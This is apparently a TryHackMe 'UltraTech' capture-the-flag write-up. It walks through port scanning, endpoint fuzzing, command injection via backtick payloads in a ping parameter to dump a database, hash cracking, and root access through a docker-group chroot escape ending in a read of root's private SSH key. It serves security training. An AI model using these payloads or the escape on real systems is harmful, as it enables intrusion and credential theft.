# THM: Ultra Tech

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/ultra_tech/ultra_tech.png" alt="Ultra Tech" width="90"/> |
| Room | UltraTech |
| URL | https://tryhackme.com/room/ultratech1 |
| Difficulty | Easy |

## Concepts/Tools Used

- [CrackStation](https://crackstation.net)
- [ffuf](../../tools/ffuf.md)
- [Gobuster](../../tools/gobuster.md)
- [GTFOBins](https://gtfobins.github.io)

## Room Description

The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-19 00:33 BST
Nmap scan report for target.thm (10.10.155.32)
Host is up (0.00031s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
MAC Address: 02:DC:08:2E:B8:23 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.66 seconds
```

I noticed that FTP isn't allowing anonymous logins. There are two web servers on this machine, both on ports other than 80 or 443. Since I don't have a login for ssh I'll start with the site on port 8081.

## Which software is using port 8081?

I can see from the nmap output above, Node.js is running on port 8081.

## Which other non-standard port is used?

FTP running on 21 and ssh running on 22 are the defaults for those services. Node.js on 8081 was already mentioned in the previous question. That leaves port 31331.

## What software is using this port?

The output above says that port 31331 is using Apache.

## Which GNU/Linux distribution seems to be used?

Looking the output for port 31331, I see that Ubuntu is mentioned.

## The software using port 8081 is a REST api, how many of its routes are used by the web application?

I tried looking around the site on port 31331 to see if I could use the Developer Toolbar to see any network calls as I clicked around on the site. I didn't see anything.

I decided to try Gobuster to see if I could find the two urls in the question. Here is the command I ran:

```bash
$ gobuster dir -u http://target.thm:8081 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

The api has two urls used by the site, the routes are /auth and /ping.

## This a database laying around, what is its filename?

I now have two api paths that I can take a look at. I looked at the /auth route but couldn't find much. The path requires credentials and I don't have anything at this point.

Browsing http://target.thm:8081/ping was a different story. I was greeted with a page that had the following stack trace error:

```bash
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

The error states that some variable is null and so the string operation of replace has failed. My guess is that this route is looking for a parameter. I am going to try fuzzing the parameter. Here is the command I ran:

```bash
$ ffuf -u http://target.thm:8081/ping?FUZZ=kwmd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt 

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://target.thm:8081/ping?FUZZ=kwmd
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

ip                      [Status: 200, Size: 49, Words: 7, Lines: 2]
```

I try to use ip with a request to localhost. Here is the output for the request to http://target.thm:8081/ping?ip=127.0.0.1:

```bash
PING localhost(localhost6.localdomain6 (::1)) 56 data bytes 64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.019 ms --- localhost ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
```

This command takes an ip address and shows the output from running ping. I want to send an ip address with a bash command to see if I have remote code execution. I made a request to http://target.thm:8081/ping?ip=127.0.0.1`ls` and got the following output:

```bash
ping: utech.db.sqlite: Name or service not known
```

There is a database called utech.db.sqlite in the directory where this api code resides.

## What is the first user's password hash?

I tried to cat out the contents of that file with http://target.thm:8081/ping?ip=127.0.0.1`cat utech.db.sqlite` and I got the following error:

```bash
curl: (52) Empty reply from server
```

I tried a few other commands and each time I used a space in the command it got that error. I remembered that for spaces urls encode them as `%20`. With that in mind I got the following output from the url http://target.thm:8081/ping?ip=127.0.0.1`cat%20utech.db.sqlite`:

```bash
\ufffd\ufffd\ufffd(REDACTEDf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
```

I have redacted the username of the first user but their password hash is f357a0c52799563c7c7b76c1e7543a32.

## What is the password associated with this hash?

I took that hash and ran it through [CrackStation](https://crackstation.net/). It has this hash cracked.

## Getting a Foothold

Using that password and the username provided when I ran cat on the utech.db.sql file, I used ssh to log in to the machine:

```bash
$ ssh REDACTED@target.thm
```

## Privilege Escalation

I ran my [usual list of commands](../../README.md#linux-privilege-escalation). The id command shows that I have access to the 116(docker) group.

I checked if any containers were running with thhe following command:

```bash
$ docker ps -a
CONTAINER ID    IMAGE   COMMAND                       CREATED       STATUS                     PORTS    NAMES
7beaaeecd784    bash    "docker-entrypoint.s\u2026"   6 years ago   Exited (130) 6 years ago            unruffled_shockley
696fb9b45ae5    bash    "docker-entrypoint.s\u2026"   6 years ago   Exited (127) 6 years ago            boring_varahamihira
9811859c4c5c    bash    "docker-entrypoint.s\u2026"   6 years ago   Exited (127) 6 years ago            boring_volhard
```

I see that no containers are running and all of them use the bash image.

Since this user is part of the docker group, I checked [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) to see what it says about docker. Here is what it says:

> Shell
>
> It can be used to break out from restricted environments by spawning an interactive system shell.
>
> The resulting is a root shell.
>
> ```bash
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
> ```

I ran that command and it couldn't find the alpine image because this box doesn't have an internet connection. I know that I have the bash image and so I adjusted my command to the following:

```bash
$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

## What are the first 9 characters of the root user's private SSH key?

I ran the following to get the SSH key:

```bash
# cat /root/.ssh/id_rsa
```
